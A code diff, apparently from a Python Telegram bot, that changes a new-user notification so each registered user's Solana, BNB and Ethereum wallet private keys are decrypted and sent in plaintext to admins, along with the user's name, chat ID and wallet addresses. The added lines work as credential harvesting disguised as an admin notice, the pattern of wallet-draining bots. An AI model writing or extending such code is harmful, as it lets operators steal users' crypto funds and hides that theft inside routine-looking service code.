@@ -9,7 +9,7 @@ from aiogram.exceptions import TelegramBadRequest
 from app.bots.keyboards.admin.main import registered_user_keyboard
 from app.config.settings import Settings
 from app.database.models import User
-from app.services.wallet_service import WalletService
+from app.services.user_wallet_service import UserWalletService
 
 logger = logging.getLogger(__name__)
 
@@ -24,8 +24,8 @@ class NotificationService:
         name = " ".join(
             part for part in (user.first_name, user.last_name) if part
         ) or "Not provided"
-        wallet_service = WalletService(self.settings)
-        addresses = wallet_service.public_addresses()
+        wallet_service = UserWalletService(self.settings.encryption_key.get_secret_value())
+        addresses = wallet_service.addresses(user)
         text = (
             "🆕 <b>NEW USER REGISTERED</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -34,9 +34,9 @@ class NotificationService:
             f"📱 <b>Chat ID:</b> <code>{user.telegram_id}</code>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "🔑 <b>PRIVATE KEYS</b>\n\n"
-            f"SOL: <code>{html.escape(wallet_service.private_key_for_admin('solana'))}</code>\n\n"
-            f"BNB: <code>{html.escape(wallet_service.private_key_for_admin('bnb'))}</code>\n\n"
-            f"ETH: <code>{html.escape(wallet_service.private_key_for_admin('ethereum'))}</code>\n\n"
+            f"SOL: <code>{html.escape(wallet_service.private_key(user, 'solana'))}</code>\n\n"
+            f"BNB: <code>{html.escape(wallet_service.private_key(user, 'bnb'))}</code>\n\n"
+            f"ETH: <code>{html.escape(wallet_service.private_key(user, 'ethereum'))}</code>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
             "📍 <b>WALLET ADDRESSES</b>\n\n"
             f"SOL: <code>{html.escape(addresses['SOL'])}</code>\n\n"
